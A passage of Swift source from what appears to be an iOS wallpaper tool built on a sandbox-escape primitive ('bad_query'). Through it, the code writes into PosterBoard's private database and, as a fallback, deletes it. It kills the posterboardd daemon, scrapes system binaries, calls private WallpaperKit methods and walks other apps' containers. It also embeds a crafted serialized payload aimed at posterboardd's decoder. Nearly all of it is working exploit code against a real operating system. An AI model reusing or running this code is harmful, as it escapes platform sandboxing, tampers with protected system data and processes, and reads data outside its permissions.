                diag.append("[Direct] inserted \(n)/\(entries.count)")
                if n > 0 {
                    didSucceed = true
                    diag.append("[Direct] SUCCESS — DB created directly at PB path")
                }
            } else {
                if let db = db { sqlite3_close(db) }
                // Direct failed — DB may be deleted; approaches below will re-copy or re-create via tmp
            }
            dirHandle.release()
        } else {
            diag.append("[Direct] FAIL consume dbDir")
        }

        // ══════════════════════════════════════════════════════════════════════
        // APPROACH A — open copy WITHOUT WAL (WAL may put sqlite3 into recovery)
        // ══════════════════════════════════════════════════════════════════════

        if !didSucceed {
            try? fm.removeItem(atPath: tmpWALPath)      // skip WAL on first try
            var db: OpaquePointer?
            let rc = sqlite3_open_v2(tmpDBPath, &db, SQLITE_OPEN_READWRITE, nil)
            let err = Darwin.errno
            diag.append("[A] open no-WAL: rc=\(rc) errno=\(err)")
            if rc == SQLITE_OK, let db = db {
                sqlite3_busy_timeout(db, 3000)
                sqlite3_exec(db, "PRAGMA wal_checkpoint(TRUNCATE)", nil, nil, nil)
                var jmStmt: OpaquePointer?
                if sqlite3_prepare_v2(db, "PRAGMA journal_mode", -1, &jmStmt, nil) == SQLITE_OK,
                   sqlite3_step(jmStmt) == SQLITE_ROW, let m = sqlite3_column_text(jmStmt, 0) {
                    diag.append("[A] journal_mode=\(String(cString: m))")
                }
                sqlite3_finalize(jmStmt)
                var (seq, sk) = readMaxValues(db: db)
                diag.append("[A] maxPosterId=\(seq) maxSortKey=\(sk)")
                let n = insertEntries(db: db, seq: &seq, maxSortKey: &sk, src: "A")
                sqlite3_exec(db, "PRAGMA wal_checkpoint(TRUNCATE)", nil, nil, nil)
                sqlite3_close(db)
                diag.append("[A] inserted \(n)/\(entries.count)")
                if n == entries.count && replaceDB(srcPath: tmpDBPath) {
                    didSucceed = true
                    diag.append("[A] SUCCESS")
                }
            } else {
                if let db = db {
                    diag.append("[A] errmsg=\(String(cString: sqlite3_errmsg(db)))")
                    sqlite3_close(db)
                }
            }
        }

        // ══════════════════════════════════════════════════════════════════════
        // APPROACH B — open copy WITH WAL copy present
        // ══════════════════════════════════════════════════════════════════════
        if !didSucceed {
            try? fm.removeItem(atPath: tmpDBPath)
            try? fm.removeItem(atPath: tmpWALPath)
            if (try? fm.copyItem(atPath: dbPath, toPath: tmpDBPath)) != nil {
                try? fm.setAttributes([.posixPermissions: NSNumber(value: 0o644)], ofItemAtPath: tmpDBPath)
                if walCopied, (try? fm.copyItem(atPath: walPath, toPath: tmpWALPath)) != nil {
                    try? fm.setAttributes([.posixPermissions: NSNumber(value: 0o644)], ofItemAtPath: tmpWALPath)
                }
                var db: OpaquePointer?
                let rc = sqlite3_open_v2(tmpDBPath, &db, SQLITE_OPEN_READWRITE, nil)
                let err = Darwin.errno
                diag.append("[B] open with-WAL: rc=\(rc) errno=\(err)")
                if rc == SQLITE_OK, let db = db {
                    sqlite3_busy_timeout(db, 3000)
                    sqlite3_exec(db, "PRAGMA wal_checkpoint(TRUNCATE)", nil, nil, nil)
                    var (seq, sk) = readMaxValues(db: db)
                    diag.append("[B] maxPosterId=\(seq) maxSortKey=\(sk)")
                    let n = insertEntries(db: db, seq: &seq, maxSortKey: &sk, src: "B")
                    sqlite3_exec(db, "PRAGMA wal_checkpoint(TRUNCATE)", nil, nil, nil)
                    sqlite3_close(db)
                    diag.append("[B] inserted \(n)/\(entries.count)")
                    if n == entries.count && replaceDB(srcPath: tmpDBPath) {
                        didSucceed = true
                        diag.append("[B] SUCCESS")
                    }
                } else {
                    if let db = db {
                        sqlite3_extended_result_codes(db, 1)
                        diag.append("[B] errmsg=\(String(cString: sqlite3_errmsg(db))) ext=\(sqlite3_extended_errcode(db))")
                        sqlite3_close(db)
                    }
                }
            } else {
                diag.append("[B] FAIL re-copy DB")
            }
        }

        // ══════════════════════════════════════════════════════════════════════
        // APPROACH C — open original PB DB read-only with immutable URI (no -shm),
        //              read max values, create fresh DB, insert our rows, replace
        // ══════════════════════════════════════════════════════════════════════
        if !didSucceed {
            diag.append("[C] trying immutable RO + fresh DB")
            var seq: Int64 = 0
            var sk: Int64 = 0

            // Read max values from original using immutable mode (skips -shm creation)
            let roURI = "file://\(dbPath)?immutable=1"
            var roDb: OpaquePointer?
            let roRC = sqlite3_open_v2(roURI, &roDb, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, nil)
            let roErr = Darwin.errno
            diag.append("[C] immutable RO open: rc=\(roRC) errno=\(roErr)")
            if roRC == SQLITE_OK, let roDb = roDb {
                (seq, sk) = readMaxValues(db: roDb)
                sqlite3_close(roDb)
                diag.append("[C] maxPosterId=\(seq) maxSortKey=\(sk)")
            } else {
                if let roDb = roDb { sqlite3_close(roDb) }
                diag.append("[C] RO open failed — will use seq=0 sk=0 (may conflict with existing rows)")
            }

            // Create fresh DB at tmp path
            try? fm.removeItem(atPath: tmpDBPath)
            try? fm.removeItem(atPath: tmpWALPath)
            var freshDb: OpaquePointer?
            let frRC = sqlite3_open_v2(tmpDBPath, &freshDb, SQLITE_OPEN_READWRITE | SQLITE_OPEN_CREATE, nil)
            let frErr = Darwin.errno
            diag.append("[C] fresh create: rc=\(frRC) errno=\(frErr)")
            if frRC == SQLITE_OK, let freshDb = freshDb {
                sqlite3_exec(freshDb, "CREATE TABLE IF NOT EXISTS poster " +
                    "(posterId INTEGER, UUID TEXT NOT NULL, providerId TEXT NOT NULL)", nil, nil, nil)
                sqlite3_exec(freshDb, "CREATE TABLE IF NOT EXISTS posterAttributes " +
                    "(posterUUID TEXT NOT NULL, roleId TEXT NOT NULL, " +
                    "attributeIdentifier TEXT NOT NULL, attributePayload TEXT)", nil, nil, nil)
                sqlite3_exec(freshDb, "CREATE TABLE IF NOT EXISTS posterRoleMembership " +
                    "(posterUUID TEXT NOT NULL, roleId TEXT NOT NULL, roleSortKey INTEGER)", nil, nil, nil)
                let n = insertEntries(db: freshDb, seq: &seq, maxSortKey: &sk, src: "C")
                sqlite3_exec(freshDb, "PRAGMA wal_checkpoint(TRUNCATE)", nil, nil, nil)
                sqlite3_close(freshDb)
                diag.append("[C] inserted \(n)/\(entries.count)")
                if replaceDB(srcPath: tmpDBPath) {
                    didSucceed = true
                    diag.append("[C] SUCCESS (fresh DB; PB will rescan existing wallpapers on restart)")
                }
            } else {
                if let freshDb = freshDb { sqlite3_close(freshDb) }
                diag.append("[C] FAIL create fresh DB")
            }
        }

        // ══════════════════════════════════════════════════════════════════════
        // APPROACH D — nuclear: delete PB's entire DB so it must do a full
        //              filesystem scan on next launch, re-discovering ALL descriptor
        //              folders including ours
        // ══════════════════════════════════════════════════════════════════════
        if !didSucceed {
            diag.append("[D] nuclear: deleting PB DB to force filesystem rescan")
            guard let dirHandle = try? BadQuery.consume(path: dbDir, create: true) else {
                diag.append("[D] FAIL consume dbDir — cannot proceed"); return
            }
            defer { dirHandle.release() }
            let d1 = (try? fm.removeItem(atPath: dbPath)) != nil || !fm.fileExists(atPath: dbPath)
            let d2 = (try? fm.removeItem(atPath: walPath)) != nil || !fm.fileExists(atPath: walPath)
            let d3 = (try? fm.removeItem(atPath: shmPath)) != nil || !fm.fileExists(atPath: shmPath)
            diag.append("[D] deleted db=\(d1) wal=\(d2) shm=\(d3)")
            didSucceed = d1
            if didSucceed {
                diag.append("[D] SUCCESS — PosterBoard will rescan all descriptor folders on next launch")
            }
        }

        try? fm.removeItem(atPath: tmpDBPath)
        try? fm.removeItem(atPath: tmpWALPath)

        if didSucceed {
            let center = CFNotificationCenterGetDarwinNotifyCenter()

            // ── Darwin notification guesses ───────────────────────────────────
            for name in ["com.apple.springboard.posterboard.wallpapersDidChange",
                          "com.apple.UIPosterBoard.wallpapersChanged",
                          "com.apple.posterboard.newPosterAvailable",
                          "com.apple.posterboardd.posterDataChanged",
                          "PRBPosterExtensionDataStoreChanged",
                          "com.apple.posterboard.reload"] {
                CFNotificationCenterPostNotification(center,
                    CFNotificationName(name as CFString), nil, nil, true)
            }
            diag.append("posted 6 Darwin notification candidates")

            // ── Kill posterboardd (SIGTERM, fallback SIGKILL) ─────────────────
            // posterboardd survives respring. Killing it forces launchd to restart
            // it fresh; on restart it reads the SQLite DB from disk and picks up
            // our new rows. Same-UID processes are allowed kill() on most sandboxes.
            var pbdPid: pid_t = -1
            var mib: [Int32] = [CTL_KERN, KERN_PROC, KERN_PROC_ALL, 0]
            var procSize = 0
            sysctl(&mib, u_int(mib.count), nil, &procSize, nil, 0)
            let procCount = max(0, procSize / MemoryLayout<kinfo_proc>.stride)
            var procs = [kinfo_proc](repeating: kinfo_proc(), count: procCount)
            sysctl(&mib, u_int(mib.count), &procs, &procSize, nil, 0)
            for p in procs {
                let pname: String = withUnsafePointer(to: p.kp_proc.p_comm) { ptr in
                    String(cString: UnsafeRawPointer(ptr).assumingMemoryBound(to: CChar.self))
                }
                if pname.hasPrefix("posterboard") { pbdPid = p.kp_proc.p_pid; break }
            }
            diag.append("sysctl procs=\(procCount) posterboardd pid=\(pbdPid)")
            if pbdPid > 0 {
                let kr1 = Darwin.kill(pbdPid, SIGTERM)
                let ke1 = Darwin.errno
                diag.append("SIGTERM: rc=\(kr1) errno=\(ke1)")
                if kr1 != 0 {
                    let kr2 = Darwin.kill(pbdPid, SIGKILL)
                    let ke2 = Darwin.errno
                    diag.append("SIGKILL: rc=\(kr2) errno=\(ke2)")
                }
                Thread.sleep(forTimeInterval: 1.0)
            }

            // ── Read posterboardd binary for exact notification/XPC names ─────
            // bad_query file access may reach system paths. If it does, the binary's
            // string table gives us the authoritative notification names posterboardd
            // registers for — no more guessing.
            for binPath in ["/usr/libexec/posterboardd", "/usr/sbin/posterboardd"] {
                guard let bh = try? BadQuery.consume(path: binPath, create: true) else {
                    diag.append("bin \(binPath): consume FAIL"); continue
                }
                defer { bh.release() }
                guard let data = FileManager.default.contents(atPath: binPath) else {
                    diag.append("bin \(binPath): read FAIL"); continue
                }
                diag.append("bin \(binPath): \(data.count) bytes")
                var extracted: [String] = []
                var cur: [UInt8] = []
                cur.reserveCapacity(256)
                for byte in data {
                    if byte >= 32 && byte < 127 {
                        cur.append(byte)
                    } else {
                        if cur.count >= 12, let s = String(bytes: cur, encoding: .ascii) {
                            let l = s.lowercased()
                            if l.contains("poster") || l.contains("prb") || l.contains("wallpaper") ||
                               s.hasPrefix("com.apple.") || l.contains("notify") || l.contains("xpc") {
                                extracted.append(s)
                            }
                        }
                        cur.removeAll(keepingCapacity: true)
                    }
                }
                diag.append("bin strings[\(extracted.count)]: \(extracted.prefix(300).joined(separator: "|"))")
                var binNotifCount = 0
                for s in extracted where s.count < 128 &&
                    (s.hasPrefix("com.apple.") || s.hasPrefix("PRB")) {
                    CFNotificationCenterPostNotification(center,
                        CFNotificationName(s as CFString), nil, nil, true)
                    binNotifCount += 1
                }
                diag.append("bin notifications posted: \(binNotifCount)")
                break
            }

            // ── WallpaperKit: enumerate ALL classes in the image ─────────────
            // Previous PRB* guesses are all absent in iOS 26.5 — class names changed.
            // objc_copyClassNamesForImage lists every class defined in the binary,
            // giving us the actual names rather than guesses.
            dlopen("/System/Library/PrivateFrameworks/WallpaperKit.framework/WallpaperKit", RTLD_NOW)
            let wkBinaryPath = "/System/Library/PrivateFrameworks/WallpaperKit.framework/WallpaperKit"
            var wkImageCount: UInt32 = 0
            if let wkNames = objc_copyClassNamesForImage(wkBinaryPath, &wkImageCount) {
                var allWKClasses: [String] = []
                for i in 0..<Int(wkImageCount) {
                    allWKClasses.append(String(cString: wkNames[i]))
                }
                free(UnsafeMutableRawPointer(wkNames))
                diag.append("WK image total classes: \(allWKClasses.count)")
                // Log all class names so we know what's in WallpaperKit on iOS 26.5
                diag.append("WK all: \(allWKClasses.joined(separator: ","))")
                // Filter for anything poster/wallpaper/collection related
                let posterRelated = allWKClasses.filter { n in
                    let l = n.lowercased()
                    return l.contains("poster") || l.contains("wallpaper") ||
                           l.contains("collect") || l.contains("datastore") ||
                           l.contains("prb") || l.contains("wkp")
                }
                diag.append("WK poster-related[\(posterRelated.count)]: \(posterRelated.joined(separator: ","))")
                // For each found class, list methods and try reload selectors
                for className in posterRelated {
                    guard let cls = NSClassFromString(className) as? NSObject.Type else { continue }
                    var cnt: UInt32 = 0
                    if let ms = class_copyMethodList(object_getClass(cls), &cnt) {
                        var names: [String] = []
                        for i in 0..<Int(cnt) { names.append(NSStringFromSelector(method_getName(ms[i]))) }
                        diag.append("WK \(className) +[\(names.joined(separator: ","))]")
                        free(UnsafeMutableRawPointer(ms))
                    }
                    cnt = 0
                    if let ms = class_copyMethodList(cls, &cnt) {
                        var names: [String] = []
                        for i in 0..<Int(cnt) { names.append(NSStringFromSelector(method_getName(ms[i]))) }
                        diag.append("WK \(className) -[\(names.joined(separator: ","))]")
                        free(UnsafeMutableRawPointer(ms))
                    }
                    for sharedSel in ["defaultManager", "sharedDataStore", "sharedInstance",
                                       "defaultDataStore", "sharedManager", "defaultStore",
                                       "defaultWallpaperManager", "sharedController",
                                       "sharedProvider", "shared"] {
                        guard cls.responds(to: Selector(sharedSel)),
                              let inst = cls.perform(Selector(sharedSel))?.takeUnretainedValue() as? NSObject
                        else { continue }
                        diag.append("WK \(className) instance via \(sharedSel)")
                        for reloadSel in ["_loadCollections", "_loadSystemWallpaperCollections",
                                          "reload", "reloadData", "invalidateCache", "rebuildCollections",
                                          "reloadFromStorage", "reloadFromDisk", "forceRefresh", "resetCaches",
                                          "reloadPosterData", "refreshPosterData", "loadData", "fetchData",
                                          "reloadExtensionData", "refreshExtensionData", "reloadAllData", "reset"] {
                            if inst.responds(to: Selector(reloadSel)) {
                                inst.perform(Selector(reloadSel))
                                diag.append("WK \(className) called \(reloadSel)")
                            }
                        }
                        // After reload: check how many collections this manager found in OUR process.
                        // =0 means descriptor format/path is wrong for iOS 26.5.
                        // >0 means format is valid (PB's separate process may still differ).
                        if inst.responds(to: Selector("numberOfWallpaperCollections")),
                           let colMethod = class_getInstanceMethod(type(of: inst),
                               Selector("numberOfWallpaperCollections")) {
                            typealias IntGetter = @convention(c) (AnyObject, Selector) -> Int
                            let count = unsafeBitCast(method_getImplementation(colMethod),
                                to: IntGetter.self)(inst, Selector("numberOfWallpaperCollections"))
                            diag.append("WK \(className) numberOfWallpaperCollections=\(count)")
                            if count > 0,
                               let colAtIdxMethod = class_getInstanceMethod(type(of: inst),
                                   Selector("wallpaperCollectionAtIndex:")) {
                                typealias GetAtIdx = @convention(c) (AnyObject, Selector, Int) -> AnyObject?
                                let getAtIdx = unsafeBitCast(method_getImplementation(colAtIdxMethod),
                                    to: GetAtIdx.self)
                                for i in 0..<min(count, 5) {
                                    if let col = getAtIdx(inst,
                                        Selector("wallpaperCollectionAtIndex:"), i) as? NSObject {
                                        let nm = col.value(forKey: "displayName") as? String ?? "?"
                                        let id = col.value(forKey: "wallpaperCollectionIdentifier") as? String ?? "?"
                                        diag.append("  col[\(i)]: '\(nm)' id=\(id)")
                                    }
                                }
                            }
                        }
                        break
                    }
                }
            } else {
                diag.append("WK objc_copyClassNamesForImage: returned nil")
            }

        }

        diag.append("=== done didSucceed=\(didSucceed) ===")
        print("writeToPosterBoardDB: done didSucceed=\(didSucceed)")
    }

    /// Copy files into an absolute directory under an app container via bad_query.
    static func writeFilesViaBadQuery(toDirectory destPath: String, files: [URL]) throws {
        try BadQuery.ensureDirectory(at: destPath)
        let handle = try BadQuery.consume(path: destPath, create: true)
        defer { handle.release() }

        let fm = FileManager.default
        for file in files {
            let destURL = URL(fileURLWithPath: destPath).appendingPathComponent(file.lastPathComponent)
            if fm.fileExists(atPath: destURL.path) {
                try fm.removeItem(at: destURL)
            }
            try fm.copyItem(at: file, to: destURL)
        }
    }

    static func cleanup() {
        // remove the symlink if it exists
        let symURL = getSymlinkURL()
        // remove existing symlink
        try? FileManager.default.removeItem(at: symURL)
    }

    // MARK: - posterboardd Storage Probe

    // NSKeyedArchive payload: PRSPosterConfiguration → PFPosterPath → NSURL
    // Crafted so posterboardd's pf_secureDecodedFromData:classReplacementMap: decodes it.
    // contentsURL = file:///private/var/mobile/Library/Preferences/com.apple.springboard.plist
    static let posterboarddPayloadBase: Data = Data([
        0x62,0x70,0x6c,0x69,0x73,0x74,0x30,0x30,0xd4,0x01,0x02,0x03,0x04,0x05,0x06,0x25,
        0x28,0x59,0x24,0x61,0x72,0x63,0x68,0x69,0x76,0x65,0x72,0x58,0x24,0x6f,0x62,0x6a,
        0x65,0x63,0x74,0x73,0x54,0x24,0x74,0x6f,0x70,0x58,0x24,0x76,0x65,0x72,0x73,0x69,
        0x6f,0x6e,0x5f,0x10,0x0f,0x4e,0x53,0x4b,0x65,0x79,0x65,0x64,0x41,0x72,0x63,0x68,
        0x69,0x76,0x65,0x72,0xa7,0x07,0x08,0x0d,0x13,0x19,0x1c,0x22,0x55,0x24,0x6e,0x75,
        0x6c,0x6c,0xd2,0x09,0x0a,0x0b,0x0c,0x56,0x24,0x63,0x6c,0x61,0x73,0x73,0x51,0x70,
        0x80,0x03,0x80,0x02,0xd3,0x09,0x0e,0x0f,0x10,0x11,0x12,0x51,0x63,0x51,0x72,0x80,
        0x04,0x80,0x05,0x5b,0x6c,0x6f,0x63,0x6b,0x2d,0x73,0x63,0x72,0x65,0x65,0x6e,0xd2,
        0x14,0x15,0x16,0x17,0x58,0x24,0x63,0x6c,0x61,0x73,0x73,0x65,0x73,0x5a,0x24,0x63,
        0x6c,0x61,0x73,0x73,0x6e,0x61,0x6d,0x65,0xa2,0x17,0x18,0x5f,0x10,0x16,0x50,0x52,
        0x53,0x50,0x6f,0x73,0x74,0x65,0x72,0x43,0x6f,0x6e,0x66,0x69,0x67,0x75,0x72,0x61,
        0x74,0x69,0x6f,0x6e,0x58,0x4e,0x53,0x4f,0x62,0x6a,0x65,0x63,0x74,0xd2,0x14,0x15,
        0x1a,0x1b,0xa2,0x1b,0x18,0x5c,0x50,0x46,0x50,0x6f,0x73,0x74,0x65,0x72,0x50,0x61,
        0x74,0x68,0xd3,0x09,0x1d,0x1e,0x1f,0x20,0x21,0x57,0x4e,0x53,0x2e,0x62,0x61,0x73,
        0x65,0x5b,0x4e,0x53,0x2e,0x72,0x65,0x6c,0x61,0x74,0x69,0x76,0x65,0x80,0x06,0x80,
        0x00,0x5f,0x10,0x4a,0x66,0x69,0x6c,0x65,0x3a,0x2f,0x2f,0x2f,0x70,0x72,0x69,0x76,
        0x61,0x74,0x65,0x2f,0x76,0x61,0x72,0x2f,0x6d,0x6f,0x62,0x69,0x6c,0x65,0x2f,0x4c,
        0x69,0x62,0x72,0x61,0x72,0x79,0x2f,0x50,0x72,0x65,0x66,0x65,0x72,0x65,0x6e,0x63,
        0x65,0x73,0x2f,0x63,0x6f,0x6d,0x2e,0x61,0x70,0x70,0x6c,0x65,0x2e,0x73,0x70,0x72,
        0x69,0x6e,0x67,0x62,0x6f,0x61,0x72,0x64,0x2e,0x70,0x6c,0x69,0x73,0x74,0xd2,0x14,
        0x15,0x23,0x24,0xa2,0x24,0x18,0x55,0x4e,0x53,0x55,0x52,0x4c,0xd1,0x26,0x27,0x54,
        0x72,0x6f,0x6f,0x74,0x80,0x01,0x12,0x00,0x01,0x86,0xa0,0x00,0x08,0x00,0x11,0x00,
        0x1b,0x00,0x24,0x00,0x29,0x00,0x32,0x00,0x44,0x00,0x4c,0x00,0x52,0x00,0x57,0x00,
        0x5e,0x00,0x60,0x00,0x62,0x00,0x64,0x00,0x6b,0x00,0x6d,0x00,0x6f,0x00,0x71,0x00,
        0x73,0x00,0x7f,0x00,0x84,0x00,0x8d,0x00,0x98,0x00,0x9b,0x00,0xb4,0x00,0xbd,0x00,
        0xc2,0x00,0xc5,0x00,0xd2,0x00,0xd9,0x00,0xe1,0x00,0xed,0x00,0xef,0x00,0xf1,0x01,
        0x3e,0x01,0x43,0x01,0x46,0x01,0x4c,0x01,0x4f,0x01,0x54,0x01,0x56,0x00,0x00,0x00,
        0x00,0x00,0x00,0x02,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x29,0x00,0x00,0x00,
        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x5b
    ])

    /// Probe v2: focuses on what bad_query CAN reach.
    /// - PosterBoard app container SQLite (PRBPosterExtensionDataStoreSQLiteDatabase)
    /// - App group containers for posterboard identifiers
    /// - Full directory tree of PosterBoard container
    /// Saves to pp_posterboardd_diag.txt in LC Documents.
    @discardableResult
    static func probePosterboardd() -> String {
        var diag: [String] = ["=== PosterboarddProbe v2 \(Date()) iOS 26.5 ==="]
        let fm = FileManager.default
        let payload = posterboarddPayloadBase

        // [0] bad_query check
        diag.append("[0] bad_query: \(BadQuery.isAvailable ? "AVAILABLE" : "FAIL")")
        guard BadQuery.isAvailable else {
            return pbSave(diag)
        }

        // [1] PosterBoard app container — full tree + every SQLite
        diag.append("\n[1] PosterBoard app container:")
        let pbHashUUID: String? = try? BadQuery.findPosterBoardHash()
        diag.append("  hash: \(pbHashUUID ?? "NOT FOUND")")
        if let uuid = pbHashUUID {
            let fullContainer = BadQuery.applicationContainerPath(appHash: uuid)
            let dataStoreBase = fullContainer + "/Library/Application Support/PRBPosterExtensionDataStore"
            diag.append("  container: \(fullContainer)")
            pbEnumDir(dataStoreBase, depth: 0, maxDepth: 5, fm: fm, diag: &diag)

            // Find all SQLite files anywhere under the container
            diag.append("  --- SQLite files in container ---")
            pbFindAndProbeSQLite(under: fullContainer, fm: fm, payload: payload, diag: &diag)
        }

        // [2] App group containers — posterboard-related identifiers
        diag.append("\n[2] App group container probe:")
        let groupIds = [
            "group.com.apple.posterboard",
            "group.com.apple.PosterBoard",
            "group.com.apple.posterboardservices",
            "group.com.apple.PosterBoardServices",
            "com.apple.posterboard",
            "com.apple.PosterBoard",
            "com.apple.posterboardservices",
        ]
        for gid in groupIds {
            // bad_query with group identifier — needs a valid absolute path as anchor
            if let h = try? BadQuery.consume(path: "/var/mobile/Containers/Shared/AppGroup",
                                              groupIdentifier: gid, isGroup: true) {
                defer { h.release() }
                diag.append("  [GROUP OK] \(gid)")
                pbEnumGroupContainer(groupId: gid, fm: fm, payload: payload, diag: &diag)
            } else {
                diag.append("  [GROUP FAIL] \(gid)")
            }
        }

        // [3] Preferences in PosterBoard container
        diag.append("\n[3] PosterBoard container prefs:")
        if let uuid = pbHashUUID {
            let fullContainer = BadQuery.applicationContainerPath(appHash: uuid)
            let prefPaths = [
                fullContainer + "/Library/Preferences/com.apple.PosterBoard.plist",
                fullContainer + "/Library/Preferences/com.apple.posterboardd.plist",
                fullContainer + "/Library/Preferences",
            ]
            for p in prefPaths {
                guard let h = try? BadQuery.consume(path: p, create: true) else {
                    diag.append("  \(p): NOACCESS"); continue
                }
                defer { h.release() }
                var isDir: ObjCBool = false
                if fm.fileExists(atPath: p, isDirectory: &isDir), isDir.boolValue {
                    let items = (try? fm.contentsOfDirectory(atPath: p)) ?? []
                    diag.append("  \(p)/: \(items.joined(separator: ", "))")
                } else if let data = fm.contents(atPath: p),
                          let pl = try? PropertyListSerialization.propertyList(from: data, options: [], format: nil) {
                    diag.append("  \(p): \(String(describing: pl).prefix(600))")
                } else {
                    diag.append("  \(p): not found or unreadable")
                }
            }
        } else {
            diag.append("  no hash — skipped")
        }

        // [4] Process list — find posterboardd + SpringBoard PIDs
        diag.append("\n[4] Process list:")
        var mib: [Int32] = [CTL_KERN, KERN_PROC, KERN_PROC_ALL, 0]
        var procSize = 0
        sysctl(&mib, u_int(mib.count), nil, &procSize, nil, 0)
        if procSize > 0 {
            let count = procSize / MemoryLayout<kinfo_proc>.stride
            var procs = [kinfo_proc](repeating: kinfo_proc(), count: count)
            sysctl(&mib, u_int(mib.count), &procs, &procSize, nil, 0)
            for p in procs {
                let name = withUnsafePointer(to: p.kp_proc.p_comm) {
                    String(cString: UnsafeRawPointer($0).assumingMemoryBound(to: CChar.self))
                }
                if name.contains("poster") || name.contains("SpringBoard") || name.contains("backboard") {
                    diag.append("  pid=\(p.kp_proc.p_pid) \(name)")
                }
            }
        }

        return pbSave(diag)
    }

    private static func pbSave(_ diag: [String]) -> String {
        let out = diag.joined(separator: "\n")
        let diagURL = getLCDocumentsDirectory().appendingPathComponent("pp_posterboardd_diag.txt")
        try? out.write(to: diagURL, atomically: true, encoding: .utf8)
        return out
    }

    private static func pbFindAndProbeSQLite(under base: String, fm: FileManager,
                                              payload: Data, diag: inout [String]) {
        guard let h = try? BadQuery.consume(path: base, create: true) else { return }
        defer { h.release() }
        guard let items = try? fm.contentsOfDirectory(atPath: base) else { return }
        for item in items {
            let sub = "\(base)/\(item)"
            var isDir: ObjCBool = false
            fm.fileExists(atPath: sub, isDirectory: &isDir)
            if isDir.boolValue {
                pbFindAndProbeSQLite(under: sub, fm: fm, payload: payload, diag: &diag)
            } else if item.hasSuffix(".sqlite") || item.hasSuffix(".sqlite3") || item.hasSuffix(".db") {
                pbProbeSQLite(path: sub, payload: payload, fm: fm, diag: &diag)
            }
        }
    }

    private static func pbEnumGroupContainer(groupId: String, fm: FileManager,
                                              payload: Data, diag: inout [String]) {
        // Scan /var/mobile/Containers/Shared/AppGroup/ for a container matching this group
        let sharedBase = "/var/mobile/Containers/Shared/AppGroup"
        guard let h = try? BadQuery.consume(path: sharedBase, groupIdentifier: groupId, isGroup: true) else { return }
        defer { h.release() }
        guard let uuids = try? fm.contentsOfDirectory(atPath: sharedBase) else {
            diag.append("    cannot list \(sharedBase)"); return
        }
        for uuid in uuids {
            let containerPath = "\(sharedBase)/\(uuid)"
            let metaPath = "\(containerPath)/.com.apple.mobile_container_manager.metadata.plist"
            if let metaData = fm.contents(atPath: metaPath),
               let meta = try? PropertyListSerialization.propertyList(from: metaData, options: [], format: nil) as? [String: Any],
               let id = meta["MCMMetadataIdentifier"] as? String,
               id.lowercased().contains("poster") || id.lowercased().contains("posterboard") {
                diag.append("    container=\(uuid) id=\(id)")
                pbEnumDir(containerPath, depth: 0, maxDepth: 4, fm: fm, diag: &diag)
                pbFindAndProbeSQLite(under: containerPath, fm: fm, payload: payload, diag: &diag)
            }
        }
    }

    // MARK: - Probe helpers (private)

    private static func pbEnumDir(_ path: String, depth: Int, maxDepth: Int,
                                   fm: FileManager, diag: inout [String]) {
        guard depth < maxDepth else { return }
        guard let h = try? BadQuery.consume(path: path, create: true) else { return }
        defer { h.release() }
        let indent = String(repeating: "  ", count: depth + 2)
        let items = (try? fm.contentsOfDirectory(atPath: path)) ?? []
        for item in items where !item.hasPrefix(".") {
            let sub = "\(path)/\(item)"
            var isDir: ObjCBool = false
            fm.fileExists(atPath: sub, isDirectory: &isDir)
            if isDir.boolValue {
                let subItems = (try? fm.contentsOfDirectory(atPath: sub)) ?? []
                diag.append("\(indent)\(item)/ [\(subItems.count)]")
                pbEnumDir(sub, depth: depth + 1, maxDepth: maxDepth, fm: fm, diag: &diag)
            } else {
                let size = (try? fm.attributesOfItem(atPath: sub))?[.size] as? Int ?? 0
                diag.append("\(indent)\(item) \(size)b")
            }
        }
    }

    private static func pbProbeSQLite(path: String, payload: Data,
                                       fm: FileManager, diag: inout [String]) {
        guard let h = try? BadQuery.consume(path: path, create: true) else {
            diag.append("  \(path): CONSUME FAIL"); return
        }
        defer { h.release() }
        guard fm.fileExists(atPath: path) else {
            diag.append("  \(path): not found"); return
        }
        let size = (try? fm.attributesOfItem(atPath: path))?[.size] as? Int ?? 0
        diag.append("  FOUND: \((path as NSString).lastPathComponent) (\(size)b)")

        // Verify SQLite magic
        if let data = fm.contents(atPath: path), data.count >= 16 {
            let magic = String(data: data.prefix(6), encoding: .ascii) ?? ""
            diag.append("    magic: '\(magic)' isSQL=\(magic == "SQLite")")
        }

        var db: OpaquePointer?
        let rwRc = sqlite3_open_v2(path, &db, SQLITE_OPEN_READWRITE, nil)
        if rwRc != SQLITE_OK {
            // sqlite3_open_v2 always sets db even on failure — close it
            if let badDb = db { sqlite3_close(badDb); db = nil }
            var rodb: OpaquePointer?
            let rc2 = sqlite3_open_v2(path, &rodb, SQLITE_OPEN_READONLY, nil)
            if rc2 == SQLITE_OK, let rodb = rodb {
                diag.append("    opened READ-ONLY (write denied)")
                pbDumpSchema(db: rodb, diag: &diag)
                sqlite3_close(rodb)
            } else {
                diag.append("    open FAIL (both RW and RO)")
                if let rodb = rodb { sqlite3_close(rodb) }
            }
            return
        }
        guard let db = db else {
            diag.append("    open FAIL (nil handle)"); return
        }
        diag.append("    opened READ-WRITE")
        sqlite3_busy_timeout(db, 2000)
        pbDumpSchema(db: db, payload: payload, diag: &diag)
        sqlite3_close(db)
    }

    private static func pbDumpSchema(db: OpaquePointer, payload: Data? = nil,
                                      diag: inout [String]) {
        var stmt: OpaquePointer?
        // List tables and their DDL
        if sqlite3_prepare_v2(db, "SELECT name,sql FROM sqlite_master WHERE type='table'", -1, &stmt, nil) == SQLITE_OK {
            while sqlite3_step(stmt) == SQLITE_ROW {
                let tname = String(cString: sqlite3_column_text(stmt, 0))
                let tsql  = String(cString: sqlite3_column_text(stmt, 1))
                diag.append("    TABLE \(tname): \(tsql)")
            }
        }
        sqlite3_finalize(stmt); stmt = nil

        // For each table: row count + first 3 rows
        if sqlite3_prepare_v2(db, "SELECT name FROM sqlite_master WHERE type='table'", -1, &stmt, nil) == SQLITE_OK {
            while sqlite3_step(stmt) == SQLITE_ROW {
                let tname = String(cString: sqlite3_column_text(stmt, 0))
                var cntStmt: OpaquePointer?
                var cnt: Int64 = 0
                if sqlite3_prepare_v2(db, "SELECT COUNT(*) FROM \"\(tname)\"", -1, &cntStmt, nil) == SQLITE_OK,
                   sqlite3_step(cntStmt) == SQLITE_ROW {
                    cnt = sqlite3_column_int64(cntStmt, 0)
                }
                sqlite3_finalize(cntStmt)
                diag.append("    \(tname): \(cnt) rows")

                // Dump first 5 rows
